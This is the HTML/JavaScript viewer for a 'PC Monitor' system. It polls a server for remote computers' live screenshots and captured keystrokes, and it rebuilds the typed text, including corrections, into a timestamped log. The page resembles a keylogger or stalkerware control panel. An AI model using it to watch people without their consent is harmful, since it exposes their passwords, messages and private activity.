<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>PC Monitor</title>
    <style>
      :root {
        color-scheme: dark;
        font-family: Inter, Arial, sans-serif;
      }

      * {
        box-sizing: border-box;
      }
      html,
      body {
        box-sizing: border-box;
      }
      body {
        background: #090b10;
        color: #f5f5f5;
        padding: 24px;
      }
      .panel {
        width: min(1600px, 100%);
        margin: 0 auto;
        background: #111726;
        border-radius: 24px;
        padding: 24px;
        box-shadow: 0 30px 90px rgba(0, 0, 0, 0.45);
        height: calc(100vh - 48px);
        overflow: hidden;
        display: grid;
      }
      .app-shell {
        display: grid;
        grid-template-columns: 320px 1fr;
        gap: 20px;
        height: 100%;
      }
      .sidebar {
        display: flex;
        flex-direction: column;
        gap: 18px;
      }
      .sidebar-header {
        display: flex;
        align-items: center;
        justify-content: space-between;
        gap: 12px;
      }
      .sidebar-title {
        margin: 0;
        font-size: 1.2rem;
        font-weight: 700;
      }
      .sidebar-subtitle {
        margin: 4px 0 0;
        color: #8b949e;
        font-size: 0.92rem;
      }
      .sidebar-actions {
        display: flex;
        gap: 10px;
      }
      .icon-button {
        width: 38px;
        height: 38px;
        display: inline-flex;
        align-items: center;
        justify-content: center;
        border: 1px solid #2b3848;
        border-radius: 12px;
        background: #0f1723;
        color: #f5f5f5;
        cursor: pointer;
        font-size: 1rem;
        padding: 0;
      }
      .text-button {
        display: inline-flex;
        align-items: center;
        justify-content: center;
        border: 1px solid #2b3848;
        border-radius: 12px;
        background: #0f1723;
        color: #f5f5f5;
        cursor: pointer;
        font-size: 0.95rem;
        padding: 0 18px;
        height: 38px;
        min-width: 120px;
      }
      .icon-button:hover,
      .text-button:hover {
        border-color: #58a6ff;
        background: rgba(88, 166, 255, 0.08);
      }
      .search-row {
        display: flex;
        margin-bottom: 16px;
      }
      .search-input {
        width: 100%;
        padding: 12px 14px;
        border-radius: 14px;
        border: 1px solid #2b3848;
        background: #0f1723;
        color: #f5f5f5;
        font-size: 0.95rem;
      }
      .search-input::placeholder {
        color: #6e7681;
      }
      .device-list {
        display: flex;
        flex-direction: column;
        gap: 12px;
        overflow-y: auto;
        height: calc(100vh - 320px);
        padding-right: 4px;
      }
      .device-card {
        display: flex;
        gap: 12px;
        align-items: center;
        padding: 14px;
        border-radius: 18px;
        border: 1px solid #263142;
        background: #111926;
        color: inherit;
        text-align: left;
        cursor: pointer;
        transition: border-color 0.18s ease, transform 0.18s ease, background 0.18s ease;
      }
      .device-card:hover,
      .device-card.selected {
        border-color: #58a6ff;
        transform: translateY(-1px);
      }
      .device-icon {
        width: 40px;
        min-width: 40px;
        height: 40px;
        border-radius: 10px;
        background: #182135;
        display: grid;
        place-items: center;
        color: #58a6ff;
        font-size: 1.2rem;
      }
      .device-text {
        min-width: 0;
      }
      .device-title {
        margin: 0;
        font-size: 0.95rem;
        font-weight: 600;
      }
      .device-detail {
        color: #8b949e;
        font-size: 0.84rem;
        margin-top: 4px;
      }
      .device-status {
        display: inline-flex;
        align-items: center;
        gap: 8px;
        margin-top: 6px;
        color: #8b949e;
        font-size: 0.82rem;
      }
      .device-status .status-dot {
        width: 8px;
        height: 8px;
        border-radius: 999px;
        background: #34d058;
      }
      .device-status .status-dot.offline {
        background: #f85149;
      }
      .device-status .status-dot.online {
        background: #34d058;
      }
      .preview-column {
        display: flex;
        flex-direction: column;
        gap: 18px;
        min-height: 0;
        height: 100%;
      }
      .preview-card {
        background: #111926;
        border: 1px solid #263142;
        border-radius: 24px;
        padding: 22px;
        display: flex;
        flex-direction: column;
        gap: 18px;
        min-height: 0;
        flex: 1 1 0;
      }
      .preview-header {
        display: flex;
        align-items: center;
        justify-content: space-between;
        gap: 16px;
      }
      .preview-title-wrap {
        display: flex;
        flex-direction: column;
        gap: 6px;
      }
      .preview-label {
        color: #58a6ff;
        font-size: 0.82rem;
        letter-spacing: 0.12em;
        text-transform: uppercase;
      }
      .preview-title {
        margin: 0;
        font-size: 1.1rem;
        font-weight: 700;
      }
      .preview-status {
        display: inline-flex;
        align-items: center;
        gap: 8px;
        color: #8b949e;
        font-size: 0.9rem;
      }
      .status-dot {
        width: 10px;
        height: 10px;
        border-radius: 999px;
        background: #34d058;
      }
        .status-dot.offline {
          background: #f85149;
        }
        .status-dot.online {
          background: #34d058;
        }
      .preview-image-wrap {
        width: 100%;
        flex: 1 1 0;
        min-height: 0;
        border-radius: 22px;
        overflow: hidden;
        background: #000;
        display: flex;
        align-items: center;
        justify-content: center;
      }
      .preview-image-wrap img {
        width: auto;
        height: auto;
        max-width: 100%;
        max-height: 100%;
        object-fit: contain;
        image-rendering: auto;
        display: block;
      }
      .preview-image-wrap.paused {
        background: #000;
      }
      .preview-image-wrap.paused img {
        display: none;
      }
      .preview-meta {
        color: #8b949e;
        font-size: 0.95rem;
      }
      .preview-badge {
        display: inline-flex;
        align-items: center;
        gap: 8px;
        padding: 6px 12px;
        border-radius: 999px;
        background: rgba(88, 166, 255, 0.08);
        color: #8b949e;
        font-size: 0.82rem;
      }
      .log-card {
        background: #111726;
        border: 1px solid rgba(255, 255, 255, 0.08);
        border-radius: 26px;
        padding: 20px;
        overflow: hidden;
        box-shadow: 0 24px 70px rgba(0, 0, 0, 0.28);
        display: flex;
        flex-direction: column;
      }
      .log-body {
        width: 100%;
        min-height: 220px;
        max-height: 320px;
        height: 320px;
        background: #ffffff;
        border-radius: 18px;
        padding: 14px;
        border: 1px solid #d1d5db;
        box-shadow: inset 0 1px 2px rgba(15, 23, 42, 0.08);
        overflow: hidden;
      }
      .keyboard-log-toolbar {
        display: flex;
        align-items: center;
        justify-content: space-between;
        gap: 12px;
        margin-bottom: 14px;
      }
      .keyboard-log-actions {
        display: flex;
        gap: 10px;
        align-items: center;
      }
      .keyboard-log-action {
        appearance: none;
        border: 1px solid #cbd5e1;
        border-radius: 12px;
        background: #f8fafc;
        color: #0f172a;
        cursor: pointer;
        font-weight: 600;
        padding: 8px 14px;
        transition: background 150ms ease, border-color 150ms ease;
      }
      .keyboard-log-action:hover {
        background: #e2e8f0;
        border-color: #94a3b8;
      }
      .keyboard-log-checkbox {
        display: inline-flex;
        align-items: center;
        gap: 8px;
        color: #475569;
        font-size: 0.9rem;
      }
      .keyboard-log-content {
        width: 100%;
        height: 100%;
        overflow-y: auto;
        overflow-x: hidden;
        padding: 12px;
        background: #ffffff;
        color: #0f172a;
        font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, 'Liberation Mono', 'Courier New', monospace;
        font-size: 0.92rem;
        line-height: 1.5;
        white-space: pre-wrap;
        word-break: break-word;
        outline: none;
        border-radius: 14px;
      }
      .keyboard-log-content::-webkit-scrollbar {
        width: 12px;
      }
      .keyboard-log-content::-webkit-scrollbar-thumb {
        background: rgba(15, 23, 42, 0.12);
        border-radius: 999px;
      }
      .keyboard-log-content::-webkit-scrollbar-track {
        background: rgba(148, 163, 184, 0.08);
      }
      .log-line {
        display: block;
      }
      .timestamp {
        color: #6b7280;
      }
      .key-label {
        display: inline-flex;
        align-items: center;
        padding: 0 0.45em;
        margin: 0 0.15em;
        border-radius: 999px;
        font-size: 0.88rem;
        font-weight: 700;
        line-height: 1.4;
      }
      .key-enter { background: #dcfce7; color: #166534; }
      .key-backspace { background: #fee2e2; color: #991b1b; }
      .key-ctrl { background: #dbeafe; color: #1d4ed8; }
      .key-tab { background: #ffedd5; color: #9a3412; }
      .key-escape, .key-delete, .key-shift, .key-alt, .key-capslock, .key-fn, .key-arrow {
        background: #f3f4f6;
        color: #334155;
      }
      .log-empty {
        padding: 18px;
        color: #475569;
        text-align: center;
        border: 1px dashed #cbd5e1;
        border-radius: 16px;
        background: #f8fafc;
      }
      .empty-state {
        padding: 28px;
        border-radius: 18px;
        border: 1px dashed #2b3848;
        color: #8b949e;
        text-align: center;
        background: #0d131d;
      }
      @media (max-width: 1120px) {
        .app-shell {
          grid-template-columns: 1fr;
        }
        .device-list {
          max-height: none;
        }
      }
    </style>
  </head>
  <body>
    <div class="panel">
      <div class="app-shell">
        <aside class="sidebar">
          <div class="sidebar-header">
            <div>
              <h1 class="sidebar-title">PC Monitor</h1>
              <div class="sidebar-subtitle" id="deviceCount">Computers</div>
            </div>
            <div class="sidebar-actions">
              <button id="refreshButton" class="icon-button" title="Refresh list">↻</button>
              <button id="addButton" class="icon-button" title="Add computer">+</button>
            </div>
          </div>
          <div class="search-row">
            <input id="deviceSearch" class="search-input" type="search" placeholder="Search computers..." />
          </div>
          <div id="deviceGrid" class="device-list"></div>
        </aside>

        <main class="preview-column">
          <section class="preview-card">
            <div class="preview-header">
              <div class="preview-title-wrap">
                <div class="preview-label">Screen monitoring</div>
                <div class="preview-status"><span class="status-dot offline" id="statusDot"></span><span id="previewStatus">OFFLINE</span></div>
                <h2 class="preview-title" id="previewTitle">No device selected</h2>
              </div>
              <div class="preview-actions">
                <button id="fullscreenButton" class="text-button" title="Fullscreen">Fullscreen</button>
                <button id="disconnectButton" class="text-button" title="Pause">Pause</button>
              </div>
            </div>
            <div id="previewImageWrap" class="preview-image-wrap">
              <img id="previewImage" alt="Screen preview" src="" />
            </div>
            <div class="preview-meta" id="previewMeta">Select a device from the list to view its screen.</div>
                <div id="debugInfo" style="color:#8b949e;margin-top:8px;font-size:0.9rem">Debugger: no data</div>
          </section>

          <section class="log-card">
            <div class="log-header">
              <h3 class="log-title">Keyboard Event Monitoring</h3>
              <div class="log-actions keyboard-log-actions">
                <button id="copyLogButton" class="keyboard-log-action" title="Copy all events">Copy All</button>
                <button id="clearLogButton" class="keyboard-log-action" title="Clear log">Clear</button>
                <label class="keyboard-log-checkbox">
                  <input id="autoScrollToggle" type="checkbox" checked /> Auto Scroll
                </label>
              </div>
            </div>
            <div class="log-body">
              <div id="keyboardLogContent" class="keyboard-log-content" tabindex="0">
                <div class="log-empty">No keyboard events yet. Use the arrow keys or Enter.</div>
              </div>
            </div>
          </section>
        </main>
      </div>
    </div>

    <script>
      const deviceGrid = document.getElementById('deviceGrid');
      const deviceCount = document.getElementById('deviceCount');
      const deviceSearch = document.getElementById('deviceSearch');
      const refreshButton = document.getElementById('refreshButton');
      const previewTitle = document.getElementById('previewTitle');
      const previewStatus = document.getElementById('previewStatus');
      const previewImage = document.getElementById('previewImage');
      const previewMeta = document.getElementById('previewMeta');
      const statusDot = document.getElementById('statusDot');
      const fullscreenButton = document.getElementById('fullscreenButton');
      const disconnectButton = document.getElementById('disconnectButton');
      const previewImageWrap = document.getElementById('previewImageWrap');
      const logBody = document.getElementById('logBody');
      const keyboardLogContent = document.getElementById('keyboardLogContent');
      const copyLogButton = document.getElementById('copyLogButton');
      const clearLogButton = document.getElementById('clearLogButton');
      const autoScrollToggle = document.getElementById('autoScrollToggle');


      let lastPayload = null;
      let selectedDeviceIndex = 0;
      let pollingEnabled = true;
      let isPaused = false;
      let activeDeviceKey = null;
      let pollTimer = null;
      let devicesFilter = '';
      let currentKeyboardEvents = [];
      let currentKeyboardIndices = [];
      const CACHE_KEY = 'monitorLastPayloadCache';
      const demoDevices = [
        {
          device_id: 'DESKTOP-01',
          safe_device_id: 'desktop-01',
          source: '192.168.1.101',
          timestamp: '2026-07-11T14:30:00',
          status: 'Online',
        },
        {
          device_id: 'OFFICE-PC',
          safe_device_id: 'office-pc',
          source: '192.168.1.102',
          timestamp: '2026-07-11T14:28:15',
          status: 'Online',
        },
        {
          device_id: 'LAPTOP-DEV',
          safe_device_id: 'laptop-dev',
          source: '192.168.1.103',
          timestamp: '2026-07-11T14:25:42',
          status: 'Offline',
        },
      ];

      function hasDemoMode() {
        return window.location.search.includes('demo=true');
      }

      function escapeHtml(value) {
        return String(value ?? '')
          .replace(/&/g, '&amp;')
          .replace(/</g, '&lt;')
          .replace(/>/g, '&gt;')
          .replace(/"/g, '&quot;');
      }

      function formatKeyboardEventTime(value) {
        const raw = String(value || '').trim();
        if (!raw) return '';
        const date = new Date(raw);
        if (!isNaN(date.getTime())) {
          const hh = String(date.getHours()).padStart(2, '0');
          const mm = String(date.getMinutes()).padStart(2, '0');
          const ss = String(date.getSeconds()).padStart(2, '0');
          const ms = String(date.getMilliseconds()).padStart(3, '0');
          return `${hh}:${mm}:${ss}.${ms}`;
        }
        return escapeHtml(raw);
      }

      function getDevices() {
        const devices = lastPayload?.devices || [];
        if (!devicesFilter) {
          return devices;
        }
        return devices.filter((device) => {
          const text = `${device.device_id || device.safe_device_id || ''} ${device.source || ''}`.toLowerCase();
          return text.includes(devicesFilter.toLowerCase());
        });
      }

      function getVisibleDevices() {
        return getDevices().filter((device) => {
          const status = (device.status || (device.timestamp ? 'Online' : 'Offline')).toString().toLowerCase();
          return status === 'online' || status === 'connected';
        });
      }

      function loadCachedPayload() {
        try {
          const raw = localStorage.getItem(CACHE_KEY);
          return raw ? JSON.parse(raw) : null;
        } catch (error) {
          return null;
        }
      }

      function saveCachedPayload(payload) {
        try {
          localStorage.setItem(CACHE_KEY, JSON.stringify(payload));
        } catch (error) {
          // ignore storage failures
        }
      }

      function updateDeviceCount(devices) {
        deviceCount.textContent = `Computers (${devices.length})`;
      }

      function buildImageUrl(device) {
        const url = device.image_url || '/latest';
        const ts = device.timestamp ? encodeURIComponent(device.timestamp) : Date.now();
        return url.includes('?') ? `${url}&ts=${ts}` : `${url}?ts=${ts}`;
      }

      function selectDevice(index) {
        const devices = getVisibleDevices();
        if (!devices.length) {
          selectedDeviceIndex = 0;
          updatePreview();
          return;
        }
        selectedDeviceIndex = ((index % devices.length) + devices.length) % devices.length;
        renderDevices();
        updatePreview();
      }

      function formatDeviceTitle(selected) {
        const deviceId = selected.device_id || selected.safe_device_id || 'Unknown device';
        const source = selected.source || '';
        const isIp = /^[\d.]+$/.test(source);
        if (source && isIp) {
          return `${deviceId} (${source})`;
        }
        return deviceId;
      }

      function getSelectedDevice() {
        const devices = getVisibleDevices();
        if (!devices.length) {
          selectedDeviceIndex = 0;
          return null;
        }
        if (selectedDeviceIndex < 0) {
          selectedDeviceIndex = 0;
        }
        if (selectedDeviceIndex >= devices.length) {
          selectedDeviceIndex = devices.length - 1;
        }
        return devices[selectedDeviceIndex] || null;
      }

      function updatePreview() {
        const selected = getSelectedDevice();
        if (!selected) {
          previewStatus.textContent = 'OFFLINE';
          statusDot.classList.add('offline');
          statusDot.classList.remove('online');
          previewTitle.textContent = 'No device selected';
          previewImage.src = '';
          previewMeta.textContent = 'Waiting for screens to arrive.';
          renderKeyboardLog([]);
          return;
        }
        activeDeviceKey = selected.device_id || selected.safe_device_id || null;
        previewStatus.textContent = 'ONLINE';
        statusDot.classList.add('online');
        statusDot.classList.remove('offline');
        previewTitle.textContent = formatDeviceTitle(selected);
        previewImage.src = buildImageUrl(selected);
        const eventCount = Array.isArray(selected.keyboard_events) ? selected.keyboard_events.filter(e => e && e.type && ['keydown', 'keypress', 'press', 'key'].includes(String(e.type).toLowerCase())).length : 0;
        previewMeta.innerHTML = `Screen monitoring · ${selected.source || 'standalone-capture-app'} · ${selected.timestamp || 'Unknown time'} <span class="preview-badge">${eventCount} keyboard event${eventCount === 1 ? '' : 's'}</span>`;
        const debugInfo = document.getElementById('debugInfo');
        try {
          debugInfo.textContent = `Keyboard events total: ${Array.isArray(selected.keyboard_events) ? selected.keyboard_events.length : 0} (press filtered: ${eventCount})`;
        } catch (e) {
          // ignore
        }
        console.log('updatePreview keyboard events:', selected.keyboard_events && selected.keyboard_events.length, 'pressCount:', eventCount);
        renderKeyboardLog(selected.keyboard_events || []);
      }

      function renderDevices() {
        const visibleDevices = getVisibleDevices();
        if (visibleDevices.length === 0) {
          selectedDeviceIndex = 0;
        } else if (selectedDeviceIndex < 0) {
          selectedDeviceIndex = 0;
        } else if (selectedDeviceIndex >= visibleDevices.length) {
          selectedDeviceIndex = visibleDevices.length - 1;
        }
        deviceGrid.innerHTML = '';
        updateDeviceCount(visibleDevices);

        if (!visibleDevices.length) {
          const empty = document.createElement('div');
          empty.className = 'empty-state';
          empty.textContent = 'No screens have been received yet.';
          deviceGrid.appendChild(empty);
          updatePreview();
          return;
        }

        visibleDevices.forEach((device, index) => {
          const deviceId = device.device_id || device.safe_device_id || 'unknown';
          const card = document.createElement('button');
          card.type = 'button';
          card.className = 'device-card' + (index === selectedDeviceIndex ? ' selected' : '');
          card.dataset.deviceId = deviceId;

          card.addEventListener('click', () => {
            selectedDeviceIndex = index;
            renderDevices();
            updatePreview();
          });

          const icon = document.createElement('div');
          icon.className = 'device-icon';
          icon.textContent = '🖥️';

          const text = document.createElement('div');
          text.className = 'device-text';

          const title = document.createElement('div');
          title.className = 'device-title';
          title.textContent = deviceId;

          const detail = document.createElement('div');
          detail.className = 'device-detail';
          detail.textContent = device.timestamp || 'No timestamp';

          const eventDetail = document.createElement('div');
          eventDetail.className = 'device-detail';
          const eventCount = Array.isArray(device.keyboard_events) ? device.keyboard_events.filter(e => e && e.type && ['keydown', 'keypress', 'press', 'key'].includes(String(e.type).toLowerCase())).length : 0;
          eventDetail.textContent = `${eventCount} keyboard event${eventCount === 1 ? '' : 's'}`;

          const status = document.createElement('div');
          status.className = 'device-status';
          const statusDot = document.createElement('span');
          statusDot.className = 'status-dot';
          let deviceStatus = (device.status || (device.timestamp ? 'Online' : 'Offline')).toString();
          const statusLower = deviceStatus.toLowerCase();
          if (statusLower === 'online' || statusLower === 'connected') {
            statusDot.classList.add('online');
          } else {
            statusDot.classList.add('offline');
          }
          status.appendChild(statusDot);
          status.appendChild(document.createTextNode(deviceStatus.toUpperCase()));

          text.appendChild(title);
          text.appendChild(detail);
          text.appendChild(status);

          card.appendChild(icon);
          card.appendChild(text);
          deviceGrid.appendChild(card);
        });
      }

      function buildUpdateKey(devices) {
        return devices
          .map((device) => `${device.device_id || device.safe_device_id || 'unknown'}:${device.timestamp || ''}`)
          .join('|');
      }

      function normalizeKeyLabel(key) {
        const value = String(key || '').trim();
        if (!value) {
          return '';
        }
        const lower = value.toLowerCase();
        if (lower === 'enter' || lower === 'return') {
          return { label: 'Enter', className: 'key-enter' };
        }
        if (lower === 'backspace') {
          return { label: 'Backspace', className: 'key-backspace' };
        }
        if (lower === 'tab') {
          return { label: 'Tab', className: 'key-tab' };
        }
        if (lower === 'escape' || lower === 'esc') {
          return { label: 'Escape', className: 'key-escape' };
        }
        if (lower === 'delete' || lower === 'del') {
          return { label: 'Delete', className: 'key-delete' };
        }
        if (lower.startsWith('key.')) {
          const suffix = lower.slice(4).replace(/\./g, '_');
          return normalizeKeyLabel(suffix.replace(/_/g, ' '));
        }
        if (/^key_[fF]\d+$/.test(value) || /^f\d+$/i.test(value)) {
          return { label: value.toUpperCase(), className: 'key-fn' };
        }
        if (lower === 'shift') {
          return { label: 'Shift', className: 'key-shift' };
        }
        if (lower === 'alt') {
          return { label: 'Alt', className: 'key-alt' };
        }
        if (lower === 'ctrl' || lower === 'control') {
          return { label: 'Ctrl', className: 'key-ctrl' };
        }
        if (lower === 'meta' || lower === 'command' || lower === 'cmd') {
          return { label: 'Meta', className: 'key-ctrl' };
        }
        if (/^key_(up|down|left|right)$/.test(lower) || /^(arrowup|arrowdown|arrowleft|arrowright)$/i.test(lower) || /^(up|down|left|right)$/.test(lower)) {
          const arrowLabel = value.replace(/key_/i, '').replace(/arrow/i, '');
          return { label: `${arrowLabel.charAt(0).toUpperCase()}${arrowLabel.slice(1)} Arrow`, className: 'key-arrow' };
        }
        if (lower === 'space') {
          return { label: 'Space', className: 'key-escape' };
        }
        return null;
      }

      function renderKeyboardLog(events) {
        const original = Array.isArray(events) ? events : [];
        const filtered = original.filter((ev) => ev && ev.type && ['keydown', 'keypress', 'press', 'key'].includes(String(ev.type).toLowerCase()));
        currentKeyboardEvents = filtered;
        currentKeyboardIndices = filtered.map((_, idx) => idx);

        if (!currentKeyboardEvents.length) {
          keyboardLogContent.innerHTML = '<div class="log-empty">No remote keyboard events yet.</div>';
          return;
        }

        const displayEvents = currentKeyboardEvents.slice(-300);
        const lines = [];
        let bufferedText = '';
        let bufferedTimestamp = '';

        function flushBuffer() {
          if (!bufferedText) return;
          lines.push({ time: bufferedTimestamp, text: bufferedText, html: escapeHtml(bufferedText) });
          bufferedText = '';
          bufferedTimestamp = '';
        }

        displayEvents.forEach((event) => {
          const time = formatKeyboardEventTime(event.time) || '??:??:??.???';
          const rawKey = String(event.key ?? '');
          const normalized = normalizeKeyLabel(rawKey.trim());
          const type = String(event.type || '').toLowerCase();
          const isPrintable = rawKey.length === 1 && /^[\w`~!@#$%^&*()\-_=+\[\]{};:'\\",.<>/?|]$/.test(rawKey);
          const isWhitespaceOnly = rawKey.length > 0 && rawKey.trim().length === 0;
          const isSpace = isWhitespaceOnly || rawKey.toLowerCase() === 'space' || rawKey.toLowerCase() === 'key.space';
          const isBackspace = normalized?.label === 'Backspace';

          if (isPrintable || isSpace) {
            if (!bufferedText) {
              bufferedTimestamp = time;
            }
            bufferedText += ' ';
            if (!isPrintable) {
              return;
            }
            bufferedText = bufferedText.slice(0, -1) + rawKey;
            return;
          }

          if (isBackspace) {
            if (bufferedText) {
              bufferedText = bufferedText.slice(0, -1);
              return;
            }
            flushBuffer();
            const labelHtml = `<span class="key-label key-backspace">Backspace</span>`;
            lines.push({ time, text: 'Backspace', html: labelHtml });
            return;
          }

          if (normalized && !isSpace) {
            flushBuffer();
            const labelHtml = `<span class="key-label ${normalized.className}">${escapeHtml(normalized.label)}</span>`;
            lines.push({ time, text: normalized.label, html: labelHtml });
            return;
          }
        });

        flushBuffer();

        const rendered = lines
          .map((line) => {
            const ts = `<span class="timestamp">[${escapeHtml(line.time)}]</span>`;
            const body = line.html || escapeHtml(line.text);
            return `<div class="log-line">${ts} ${body}</div>`;
          })
          .join('');

        keyboardLogContent.innerHTML = rendered;
        if (autoScrollToggle.checked) {
          keyboardLogContent.scrollTop = keyboardLogContent.scrollHeight;
        }
      }

      function setPausedState(paused) {
        isPaused = paused;
        pollingEnabled = !paused;
        disconnectButton.textContent = paused ? 'Resume' : 'Pause';
        disconnectButton.title = paused ? 'Resume' : 'Pause';
        if (paused) {
          previewStatus.textContent = 'PAUSED';
          statusDot.classList.remove('online');
          statusDot.classList.add('offline');
          previewImageWrap.classList.add('paused');
          previewImage.src = '';
          previewMeta.textContent = 'Monitoring paused. The screen preview is black.';
          return;
        }
        previewImageWrap.classList.remove('paused');
        previewStatus.textContent = 'ONLINE';
        statusDot.classList.remove('offline');
        statusDot.classList.add('online');
        previewMeta.textContent = 'Monitoring resumed.';
        updatePreview();
      }

      function setDisconnectedState() {
        pollingEnabled = false;
        const cached = loadCachedPayload();
        if (cached && Array.isArray(cached.devices) && cached.devices.length) {
          lastPayload = cached;
          renderDevices();
          updatePreview();
          previewStatus.textContent = 'OFFLINE';
          statusDot.classList.remove('online');
          statusDot.classList.add('offline');
          previewMeta.textContent = 'Offline: showing cached keyboard events until reconnect.';
          return;
        }
        lastPayload = { devices: [] };
        previewStatus.textContent = 'OFFLINE';
        statusDot.classList.remove('online');
        statusDot.classList.add('offline');
        previewTitle.textContent = 'No device selected';
        previewImage.src = '';
        previewMeta.textContent = 'Waiting for screens to arrive.';
        renderKeyboardLog([]);
        renderDevices();
      }

      async function pollOnce() {
        if (!pollingEnabled || isPaused) {
          return;
        }
        try {
          const response = await fetch('/latest.json', { cache: 'no-store' });
          if (!response.ok) {
            throw new Error('Network error');
          }
          const data = await response.json();
          let devices = data.devices || [];
          if (!devices.length && hasDemoMode()) {
            devices = demoDevices;
          }
          lastPayload = { devices };
          saveCachedPayload(lastPayload);
          renderDevices();
          updatePreview();
        } catch (error) {
          setDisconnectedState();
        }
      }

      deviceSearch.addEventListener('input', (event) => {
        devicesFilter = event.target.value;
        selectedDeviceIndex = 0;
        renderDevices();
        updatePreview();
      });

      refreshButton.addEventListener('click', () => {
        if (isPaused) {
          setPausedState(false);
        }
        pollingEnabled = true;
        pollOnce();
      });

      fullscreenButton.addEventListener('click', () => {
        if (!document.fullscreenElement) {
          const element = previewImageWrap;
          if (element.requestFullscreen) {
            element.requestFullscreen();
          } else if (element.webkitRequestFullscreen) {
            element.webkitRequestFullscreen();
          } else if (element.msRequestFullscreen) {
            element.msRequestFullscreen();
          }
        } else {
          if (document.exitFullscreen) {
            document.exitFullscreen();
          } else if (document.webkitExitFullscreen) {
            document.webkitExitFullscreen();
          } else if (document.msExitFullscreen) {
            document.msExitFullscreen();
          }
        }
      });

      document.addEventListener('fullscreenchange', () => {
        const isFullscreen = Boolean(document.fullscreenElement);
        fullscreenButton.textContent = isFullscreen ? 'Exit Fullscreen' : 'Fullscreen';
        fullscreenButton.title = isFullscreen ? 'Exit fullscreen mode' : 'Fullscreen';
      });

      disconnectButton.addEventListener('click', () => {
        setPausedState(!isPaused);
      });

      clearLogButton.addEventListener('click', () => {
        const selected = getSelectedDevice();
        if (selected && Array.isArray(selected.keyboard_events)) {
          const filtered = selected.keyboard_events.filter((ev) => {
            if (!ev || !ev.type) return true;
            const t = String(ev.type).toLowerCase();
            return !(['press', 'key', 'keyup'].includes(t));
          });
          selected.keyboard_events = filtered;
          if (lastPayload?.devices) {
            const deviceId = selected.device_id || selected.safe_device_id;
            const matchingDevice = lastPayload.devices.find((item) => (item.device_id || item.safe_device_id) === deviceId);
            if (matchingDevice) {
              matchingDevice.keyboard_events = filtered;
            }
          }
        }
        currentKeyboardEvents = [];
        renderKeyboardLog([]);
        updatePreview();
      });

      copyLogButton.addEventListener('click', async () => {
        const text = Array.from(keyboardLogContent.querySelectorAll('.log-line'))
          .map((node) => node.textContent || '')
          .join('\n');
        try {
          await navigator.clipboard.writeText(text);
        } catch (err) {
          const textarea = document.createElement('textarea');
          textarea.value = text;
          textarea.style.position = 'fixed';
          textarea.style.opacity = '0';
          document.body.appendChild(textarea);
          textarea.focus();
          textarea.select();
          document.execCommand('copy');
          document.body.removeChild(textarea);
        }
      });

      autoScrollToggle.addEventListener('change', () => {
        if (autoScrollToggle.checked) {
          keyboardLogContent.scrollTop = keyboardLogContent.scrollHeight;
        }
      });

      updatePreview();
      pollOnce();
      pollTimer = setInterval(() => {
        if (pollingEnabled) {
          pollOnce();
        }
      }, 400);
    </script>
  </body>
</html>
